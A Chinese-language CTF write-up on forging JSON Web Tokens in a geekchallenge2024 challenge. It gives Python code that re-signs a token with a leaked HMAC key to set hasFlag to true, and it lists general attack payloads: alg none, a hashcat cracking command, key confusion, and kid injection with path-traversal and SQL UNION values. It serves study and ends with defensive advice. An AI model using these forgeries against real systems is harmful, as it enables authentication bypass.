# 14 · JWT 伪造

geekchallenge2024 实证

## 一、结构

```
base64url(header) . base64url(payload) . base64url(signature)
        ↑ 头              ↑ 载荷              ↑ 签名
```

```json
header  = {"typ":"JWT","alg":"HS256"}
payload = {"iss":"Starven","aud":"Ctfer","iat":…,"nbf":…,"exp":…,
           "username":"Starven","password":"qwert123456","hasFlag":false}
```

**HS256 签名**：

```python
signing_input = f"{header_b64}.{payload_b64}".encode()      # 是字符串，不是 JSON！
signature = base64url(HMAC-SHA256(key, signing_input))
```

> **口诀**：**`header.payload` 这两个字符串进 HMAC**，签名结果再 base64url。

**三个必须记住的点**：

| # | 要点 | 踩了会怎样 |
|---|---|---|
| 1 | 签名对象是**两段原始 base64 串用 `.` 拼成的字符串** | 拿 JSON 重新序列化去签 → 永远对不上 |
| 2 | **payload 字节必须原样保留** | `json.dumps()` 会改变格式（冒号后多空格），签名失效 |
| 3 | **base64url 去掉 `=` 填充**（`rstrip(b"=")`） | 带填充段在真验签处失败 |

## 二、base64 vs base64url

|  | **标准 base64** | **base64url** |
|---|---|---|
| 字符 62 / 63 | `+` / `/` | `-` / `_` |
| 填充 `=` | 通常保留 | **去掉** |
| JWT 用哪个 | 不推荐 | **规范要求** |

**本题 27 种组合实测**：header / payload / signature 三段各用 std / url / std-去填充 —— **27 种组合全部 PASS**；签名段填 `"A"*43`、留空、加空格也全部 PASS；payload 段把 `_`→`/`、`-`→`+`、末尾加 `=` 同样 PASS。

> **本题编码方式完全不影响结果** —— 服务端 `base64_decode` 很宽容（本身就忽略非法字符）；**但仍建议用标准 base64url**，理由不是「服务端要求」，而是**传输安全**：`+` 在 URL / 表单里会被解成空格，`=` 可能被某些 Cookie 解析器截断 —— 真验签的题里，`+` 被吃成空格 → 签名校验必然失败。

## 三、判定实验：服务端验不验签（**诊断，不是解法**）

| 送法 | 结果 |
|---|---|
| 改 payload，签名保留旧值 | PASS |
| 改 payload，用泄露密钥重签 | PASS |
| 改 payload，签名 = **随机垃圾** | PASS |
| 改 payload，**签名段留空** | PASS |
| 改 payload，**只发两段（无签名）** | PASS |
| 改 payload，**发四段** | PASS |
| **签名完全正确，但 `hasFlag=false`** | **BLOCKED** |
| payload 里 `password` → `parsword` | **BLOCKED** |

**结论**：服务端只 `explode('.')` → `base64_decode(parts[1])` → `json_decode` → 看 `hasFlag`。

```php
// 反推出的逻辑
$parts   = explode('.', $cookie_token);
$payload = json_decode(base64_decode($parts[1]));
if ($payload->hasFlag == true && ...) { echo $flag; }
// $parts[2]（签名）从头到尾没被用过
```

**这个诊断怎么用**：

```
先不重签发一次
   ├─ 没过 → 只能上重签 → 走第三节的 jwt_forge()（正解）
   └─ 过了 → 说明服务端有洞，但仍然走重签
```

**为什么不把「改 payload 不重签」当解法**：

| 理由 | 说明 |
|---|---|
| 靠的是**服务端的漏洞**，不是通用手法 | 换一道真验签的题立刻失效 |
| **绕过了最该学的点** | JWT 题的考点就是签名对象、HMAC 重签 |
| 真实环境不成立 | 正常 JWT 库都验签 |
| 复盘/面试说不出所以然 | 「改了 payload 没重签就过了」不是能力，是运气 |

**→ 无论诊断结果如何，写进 WP 的解法只用 `jwt_forge()`。**

## 四、URL 编码层级：只能编一次

| 编码次数 | 结果 |
|---|---|
| 原样 | PASS |
| **编码 1 次** | PASS |
| **编码 2 次** | **BLOCKED** |
| 编码 3 次 | BLOCKED |

**原因：PHP 的 `$_COOKIE` 会自动 `urldecode` 一次。**

```
你发: eyJ...%2EeyJpc3...   → PHP 解一次: eyJ...eyJpc3...  ← 点还原了
再编: eyJ...%252EeyJpc3...  → PHP 解一次: eyJ...%2EeyJpc3... ← 还是 %2E！
                             explode('.') → 只有 1 段 
```

## 五、结构容错矩阵与体检函数（实测）

| 结构 | 结果 |
|---|---|
| 三段 `h.p.s` | PASS |
| **两段 `h.p`（无签名）** | PASS |
| **四段 `h.p.s.extra`** | PASS |
| 一段（**无点**） | BLOCKED ← 最常见的手抄事故 |

**可复用工具（四个函数 + 体检）**：

```python
import base64, hashlib, hmac, json, time

def b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))   # 补填充

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()   # 去填充

def hs256_sign(header_b64, payload_b64, key):
    signing_input = f"{header_b64}.{payload_b64}".encode()     # 字符串，不是 JSON
    return b64url_encode(hmac.new(key, signing_input, hashlib.sha256).digest())

def jwt_forge(token, key, old, new):
    """在 payload 原始字节上替换，再重新签名（长度随便变）"""
    header_b64, payload_b64, _ = token.split(".")
    raw = b64url_decode(payload_b64)
    if len(new) < len(old):                     # 等长对齐（补空格）
        new = new + b" " * (len(old) - len(new))
    new_raw = raw.replace(old, new, 1)
    new_payload_b64 = b64url_encode(new_raw)
    return f"{header_b64}.{new_payload_b64}.{hs256_sign(header_b64, new_payload_b64, key)}"

def jwt_doctor(token):
    parts = token.split(".")
    print("段数:", len(parts), "(必须 3)")
    if len(parts) != 3: return
    h, p, s = parts
    raw = b64url_decode(p)
    print("payload 原始字节:", raw)
    print("payload 解析    :", json.dumps(json.loads(raw), ensure_ascii=False))
    print("含 +/-/= 的段   :", [c for c in "+/=" if any(c in x for x in parts)])
    obj = json.loads(raw)
    for k in ("password", "parsword"):                 # 字段名拼写检查
        if k in obj: print(f"字段名: {k}", "对" if k == "password" else "拼错了")
    if "exp" in obj:
        print("剩余有效: %.1f 分钟" % ((obj["exp"] - time.time()) / 60))
```

**利用骨架（**唯一推荐写法**）**：

```python
h, p, s = token.split(".")
assert hs256_sign(h, p, key) == s, "密钥不对"          # 先验签，确认密钥正确
forged = jwt_forge(token, key, b"false", b"true")      # 改字节 + 重签 ← 只用这条
```

## 六、 攻击面清单

| 攻击面 | 核心 payload / 做法 | 生效前提 | 来源 |
|---|---|---|---|
| **HS256 重签** **正解** | 用泄露密钥 `HMAC-SHA256(key, "h.p")` | 密钥泄露 / 弱密钥可猜 | **本题实证**（`Starven_secret_key`） |
| **改字节 + 重签** **正解** | `b64url_decode` → 改字节 → `b64url_encode` → 重新签名 | 拿到密钥即可；**长度随便变** | **本题实证** |
| 改 payload 不重签 | 只替换 payload 段，签名原样留 | 服务端**只解码不验签** | **仅诊断用，不作为解法** |
| 结构降级 | 两段 `h.p` / 四段 `h.p.s.x` | `explode` 后只取 `parts[1]` | 本题实证（同样仅诊断） |
| **`alg: none`** | header 改 `{"alg":"none","typ":"JWT"}`，签名段留空或删掉 | 库**未强制白名单**算法（旧版 PyJWT / jsonwebtoken / php-jwt） | **通用补充，未在本题验证** |
| **弱密钥爆破** | `hashcat -m 16500 jwt.txt wordlist.txt`（或 `jwt_tool -C -d wl.txt`） | HS256 + 弱口令密钥 | **通用补充，未在本题验证** |
| **RS256 → HS256 混淆** | header 改 `HS256`，用**服务器公钥**当 HMAC 密钥签 | 库按 header 里的 `alg` 选算法，且拿同一份 key 当两种用途 | **通用补充，未在本题验证** |
| **`kid` 注入** | `{"kid":"../../../../dev/null"}` / `{"kid":"' UNION SELECT 'k'-- -"}` / `kid` 指向可预测文件 | `kid` 被拼进文件路径或 SQL | **通用补充，未在本题验证** |
| **`jwk` / `jku` 注入** | header 塞自控 `jwk`，或 `jku` 指向自己的 JWKS | 库信任 header 自带密钥源 | **通用补充，未在本题验证** |
| **`exp` 绕过** | 改 `exp` 为极大值 / 直接删掉 `exp` | 服务端不校验过期或容忍缺失 | **通用补充，未在本题验证** |

**经验顺序**：先 `jwt_doctor` 解码看 payload（段数 → 字段名 → 字节长度）→ 找密钥（泄露 / 弱口令 / 公钥混淆）→ **`jwt_forge()` 改字节 + 重签（正解）** → 仍不行再看 `alg` / `kid` 这类结构性攻击。

**防御侧（对照记）**：服务端**固定允许的算法白名单**、`kid` 不拼路径 / SQL、绝不把公钥当 HMAC 密钥、密钥用高熵随机值。


## 七、一句话

> **JWT = `base64url(header).base64url(payload).base64url(signature)`；HS256 签的是「两个 base64 串用 `.` 拼成的字符串」，payload 字节必须原样保留，base64url 不去 `=` 填充就会出问题。**
> **改 payload 一律「base64 解码 → 改字节 → 重编码 → 重新签名」；只要重签，长度随便变，不用管对齐。**
> **不通过时先数点（必须 3 段）、再查编码（URL 只编一次）、最后才怀疑密钥。**
> **解法只用一条：`jwt_forge()` —— 改字节 + 重新 HS256 签名。**「改 payload 不重签」只用来判断服务端验不验签，是诊断，不是解法。
